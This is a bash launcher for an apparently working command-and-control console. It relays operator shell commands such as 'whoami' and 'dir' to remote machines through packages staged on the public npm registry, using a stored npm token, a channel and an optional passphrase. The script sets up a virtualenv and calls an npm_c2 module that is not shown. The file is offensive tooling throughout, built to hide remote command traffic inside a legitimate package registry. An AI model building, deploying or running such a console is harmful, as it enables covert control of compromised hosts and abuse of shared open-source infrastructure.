#!/usr/bin/env bash
# npm-c2 operator console, over the npm staging transport.
#
#   ./c2.sh                 interactive console
#   ./c2.sh "whoami"        one command and its output
#   ./c2.sh -c beef "dir"   override the channel for one run
#
# Reads config.json if present. Environment variables override it:
# C2_PKG, C2_TOKEN, C2_CHAN, C2_PASS, NPMC2_API_BASE.
set -euo pipefail

cd "$(dirname "$0")"

CFG_PKG="" CFG_TOKEN="" CFG_CHAN="" CFG_PASS="" CFG_BASE=""
if [[ -f config.json ]]; then
  IFS=$'\t' read -r CFG_PKG CFG_TOKEN CFG_CHAN CFG_PASS CFG_BASE < <(
    python3 -c '
import json
c = json.load(open("config.json"))
keys = ("package", "token", "channel", "passphrase", "registry")
print("\t".join(str(c.get(k) or "") for k in keys))
')
fi

PKG="${C2_PKG:-$CFG_PKG}"
TOKEN="${C2_TOKEN:-$CFG_TOKEN}"
CHAN="${C2_CHAN:-${CFG_CHAN:-c0ff}}"
PASS="${C2_PASS:-$CFG_PASS}"
BASE="${NPMC2_API_BASE:-${CFG_BASE:-https://registry.npmjs.org}}"

if [[ -z "$PKG" ]]; then
  echo "[-] no package: edit config.json or set C2_PKG" >&2
  exit 1
fi
if [[ -z "$TOKEN" ]] && [[ -f .c2token ]]; then
  TOKEN="$(< .c2token)"
fi
if [[ -z "$TOKEN" ]]; then
  echo "[-] no token: edit config.json, set C2_TOKEN or create .c2token" >&2
  exit 1
fi

# A per-repo virtualenv keeps the host Python untouched.
if [[ ! -x .venv/bin/python ]]; then
  echo "[+] creating .venv"
  python3 -m venv .venv
  .venv/bin/python -m pip install -q --upgrade pip
  .venv/bin/python -m pip install -q -e .
fi
if ! .venv/bin/python -c 'import npm_c2' >/dev/null 2>&1; then
  .venv/bin/python -m pip install -q -e .
fi

if [[ "${1:-}" == "-c" ]]; then
  CHAN="${2:?missing channel after -c}"
  shift 2
fi

ARGS=(stage -p "$PKG" -t "$TOKEN" -c "$CHAN" --base "$BASE" --timeout 120 --interval 4)
if [[ -n "$PASS" ]]; then
  ARGS+=(--passphrase "$PASS")
fi

exec .venv/bin/python -m npm_c2 "${ARGS[@]}" "$@"
